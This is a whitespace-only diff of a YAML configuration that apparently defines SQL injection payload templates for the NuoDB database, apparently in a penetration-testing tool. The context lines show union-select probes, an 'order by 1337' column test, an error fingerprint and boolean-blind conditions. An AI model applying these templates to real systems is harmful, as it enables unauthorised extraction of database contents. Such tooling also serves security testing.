@@ -10,6 +10,7 @@ resource:
       || '${TRAIL_SQL}'
       r
   from dual
+  
  schema: 
   database: |
    select 
@@ -28,6 +29,7 @@ resource:
        ) t
        {limit}
    ) a
+   
   table: |
    select 
        rr
@@ -46,6 +48,7 @@ resource:
        ) t
        {limit}
    ) a
+   
   column: |
    select 
        rr
@@ -65,6 +68,7 @@ resource:
        ) t
        {limit}
    ) a
+   
   row: 
    query: |
     select 
@@ -86,6 +90,7 @@ resource:
    fields: 
     field: "${FIELD}"
     concat: "|| '%7f' ||"
+    
 strategy: 
  configuration: 
   slidingWindow: |
@@ -105,10 +110,12 @@ strategy:
   fingerprint: 
    errorMessage: 
     - nuodb
+    
  normal: 
   indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE})"
   capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)"
   orderBy: "order by 1337"
+  
  boolean: 
   test: 
    falses: 
@@ -136,4 +143,5 @@ strategy:
     ) 
     %26 ${BIT})
    length: "char_length((${INJECTION})) > ${INDEX}"
+   
   blind: "and ${TEST}"
